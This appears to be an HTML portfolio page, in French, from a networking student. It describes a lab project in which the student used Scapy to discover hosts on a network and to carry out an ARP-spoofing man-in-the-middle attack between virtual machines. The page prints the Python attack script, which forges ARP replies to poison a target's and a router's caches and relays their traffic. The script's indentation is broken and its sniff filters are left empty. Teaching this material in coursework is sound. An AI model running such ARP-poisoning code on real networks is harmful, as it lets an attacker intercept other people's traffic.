@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SAÉ1.05 - Traiter des données</title>
+  <link rel="stylesheet" href="../styles/main.css">
+</head>
+<body>
+  <header>
+    <div class="header-container">
+      <a href="../index.html" class="logo">Portfolio</a>
+      <nav>
+        <button class="menu-toggle">
+          <span></span><span></span><span></span>
+        </button>
+        <ul class="nav-links">
+          <li><a href="../index.html" class="nav-link">Accueil</a></li>
+          <li class="nav-dropdown">
+            <button class="nav-link dropdown-toggle">Compétences ▼</button>
+            <ul class="dropdown-menu">
+              <li><a href="./competence-1.html" class="dropdown-item">1. Administrer les réseaux et l'Internet</a></li>
+              <li><a href="./competence-2.html" class="dropdown-item">2. Connecter les entreprises et les usagers</a></li>
+              <li><a href="./competence-3.html" class="dropdown-item">3. Créer des outils et applications informatiques pour les R&T</a></li>
+              <li><a href="./competence-4.html" class="dropdown-item">4. Gérer les infrastructures et les services des réseaux opérateurs</a></li>
+              <li><a href="./competence-5.html" class="dropdown-item">5. Gérer les communications unifiées et la vidéo sur Internet</a></li>
+            </ul>
+          </li>
+          <li><a href="./liste-sae.html" class="nav-link">Liste des SAE</a></li>
+          <li><a href="./cv.html" class="nav-link">CV</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="section">
+      <div class="container">
+        <nav class="breadcrumbs">
+          <a href="../index.html">Accueil</a> <span>/</span> <a href="./competence-3.html">Compétence 3</a> <span>/</span> <span>SAÉ1.05</span>
+        </nav>
+
+        <div class="section-header">
+          <h2>SAÉ1.05 - Traiter des données</h2>
+        </div>
+
+        <!-- Objectifs -->
+        <div class="card" style="margin-bottom: 24px;">
+          <h3 style="margin-bottom: 16px; color: var(--color-primary);">Objectifs du projet</h3>
+          <p style="color: var(--color-text-light); line-height: 1.8;">
+            Lors de cette SAE, notre objectif était de développer des compétences en cybersécurité et en programmation réseau en utilisant Scapy. Nous avons d'abord réalisé un programme capable de découvrir les hôtes d'un réseau, ce qui nous a permis de mieux comprendre les protocoles de communication et les méthodes d'analyse de réseau. Ensuite, nous avons développé un programme pour effectuer une attaque de l'homme du milieu (MITM), ce qui nous a permis d'explorer les vulnérabilités des réseaux et d'acquérir des connaissances pratiques sur la protection contre de telles menaces.
+          </p>
+        </div>
+
+        <!-- Apprentissages Critiques -->
+        <div class="card" style="margin-bottom: 24px;">
+          <h3 style="margin-bottom: 16px; color: var(--color-primary);">Apprentissages Critiques appliqués</h3>
+          <ul style="margin-left: 20px; color: var(--color-text-light);">
+            <li style="margin-bottom: 8px;"><span style="background-color: rgba(124, 58, 237, 0.15); padding: 2px 6px; border-radius: 3px;"><strong>AC13.01</strong></span> | J'ai appris à utiliser des outils comme Scapy et des machines virtuelles pour simuler des réseaux.</li>
+            <li style="margin-bottom: 8px;"><span style="background-color: rgba(124, 58, 237, 0.15); padding: 2px 6px; border-radius: 3px;"><strong>AC13.02</strong></span> | J'ai dû comprendre Scapy, mais aussi améliorer mes scripts pour répondre aux exigences.</li>
+            <li style="margin-bottom: 8px;"><span style="background-color: rgba(124, 58, 237, 0.15); padding: 2px 6px; border-radius: 3px;"><strong>AC13.03</strong></span> | Implémentations avec Python et Scapy.</li>
+            <li style="margin-bottom: 8px;"><span style="background-color: rgba(124, 58, 237, 0.15); padding: 2px 6px; border-radius: 3px;"><strong>AC13.04</strong></span> | Manipulations de paquets.</li>
+            <li style="margin-bottom: 8px;"><span style="background-color: rgba(124, 58, 237, 0.15); padding: 2px 6px; border-radius: 3px;"><strong>AC13.06</strong></span> | Lorsque j'ai travaillé avec des machines virtuelles et partagé des résultats et des analyses avec des collègues pour des révisions et des améliorations continues.</li>
+          </ul>
+        </div>
+
+        <!-- Réalisation -->
+        <div class="card" style="margin-bottom: 24px;">
+          <h3 style="margin-bottom: 16px; color: var(--color-primary);">Réalisation</h3>
+          <p style="color: var(--color-text-light); line-height: 1.8;">
+            Pour ce projet, nous avons utilisé Scapy pour créer deux programmes. Le premier programme visait à découvrir les hôtes sur un réseau. En utilisant Scapy, nous avons envoyé des requêtes ARP et analysé les réponses pour identifier les appareils connectés. Le deuxième programme était la réalisation d'une attaque de l'homme du milieu (MITM). Avec Scapy, nous avons intercepté et manipulé le trafic réseau entre deux hôtes en redirigeant le trafic via notre machine et en modifiant les tables ARP des cibles. Nous avons travaillé dans un environnement simulé avec des machines virtuelles pour effectuer ces programmes. On a rencontré beaucoup de difficulté avec cette SAE surtout pour un début d'année je n'avais pas encore assez de compétences en python.
+          </p>
+        </div>
+
+        <!-- Compétences développées -->
+        <div class="card" style="margin-bottom: 32px;">
+          <h3 style="margin-bottom: 16px; color: var(--color-primary);">Compétences et apprentissages développés</h3>
+          <p style="color: var(--color-text-light); line-height: 1.8;">
+            Cette SAE a été un défi majeur en début d'année pour moi en raison de sa complexité élevée. Manipuler des paquets réseau avec Scapy et mettre en place une attaque MITM nécessitait une compréhension approfondie des protocoles ARP et des mécanismes de sécurité. Travailler avec des machines virtuelles pour simuler des environnements réseau était également nouveau. Malgré ces obstacles, j'ai pu renforcer ma capacité à surmonter des défis techniques complexes, démontrant ainsi ma détermination et ma progression dans des domaines techniques exigeants. En toute honnêteté, je ne pense pas avoir acquis toutes les compétences nécessaires durant ce projet.
+          </p>
+        </div>
+
+        <!-- Code attaque MITM -->
+        <div style="background-color: rgba(124, 58, 237, 0.05); padding: 16px; border-radius: 8px; margin-bottom: 32px; border-left: 4px solid var(--color-primary);">
+          <p style="color: var(--color-text-light); margin: 0 0 12px 0;"><strong style="color: var(--color-primary);">📝 Code attaque de l'homme du milieu :</strong></p>
+          <pre style="background-color: #1e1e1e; color: #d4d4d4; padding: 12px; border-radius: 6px; overflow-x: auto; font-size: 12px; line-height: 1.5;"><code>from scapy.all import *
+#Création des trames pour l'attaque
+trametype=Ether(type=0x0806)
+#Trame vers la cible
+packet=ARP()
+packet.hwlen=6    #Taille en octet @MAC
+packet.plen=4      #Taille en octet @IP
+packet.op=2
+packet.psrc='192.168.1.1'      #ip de la machine pour laquelle on se fait passer
+packet.pdst='192.168.1.138'      #ip cible
+packet.hwsrc='00:0c:29:7e:cc:75'      #notre @MAC attaquante
+packet.hwdst='00:0c:29:fe:6e:1b'      #@MAC cible
+trame1=trametype/packet
+#Trame vers le routeur
+packet2=ARP()
+packet2.hwlen=6 #Taille en octet @MAC
+packet2.plen=4 #Taille en octet @IP
+packet2.op=2
+packet2.psrc='192.168.1.138'      #ip de la cible
+packet2.pdst='192.168.1.1'         #ip du routeur
+packet2.hwsrc='00:0c:29:7e:cc:75'      #notre @MAC attaquante
+packet2.hwdst='2c:79:d7:be:5b:23'    #@MAC du routeur
+trame2=trametype/packet2
+#Debut de l'attaque
+while True:
+sendp(trame1)
+sendp(trame2)
+retour1=sniff(count=1, filter="host ()")        #ip cible
+retour2=sniff(count=1, filter="host ()")        #ip routeur
+#Après avoir récuperé les réponses on les renvoie aux bons destinataires
+retour1[IP].dst='192.168.1.1'       #ip routeur
+sendp(retour1)
+retour2[IP].dst='192.168.1.138'     #ip cible
+sendp(retour2)</code></pre>
+        </div>
+
+        <div style="text-align: center; margin-top: 40px;">
+          <a href="./competence-3.html" class="btn btn-secondary">Retour à la compétence 3</a>
+          <a href="../index.html" class="btn btn-primary" style="margin-left: 12px;">Accueil</a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="footer-container">
+      <div class="footer-section"><h3>Portfolio</h3><p>BUT Réseaux & Télécoms<br/>Parcours ROM - 3e année</p></div>
+      <div class="footer-section"><h3>Navigation</h3><ul style="list-style: none;"><li><a href="../index.html">Accueil</a></li><li><a href="./competence-1.html">Compétences</a></li><li><a href="./cv.html">CV</a></li></ul></div>
+      <div class="footer-section"><h3>Contact</h3><ul style="list-style: none;"><li><a href="mailto:contact@example.com">Email</a></li><li><a href="https://github.com" target="_blank">GitHub</a></li><li><a href="https://linkedin.com" target="_blank">LinkedIn</a></li></ul></div>
+    </div>
+    <div class="footer-bottom"><p>&copy; 2026 Portfolio. Tous droits réservés.</p></div>
+  </footer>
+
+  <script src="../js/components.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      initMenuToggle();
+      initDropdownMenu();
+    });
+  </script>
+</body>
+</html>
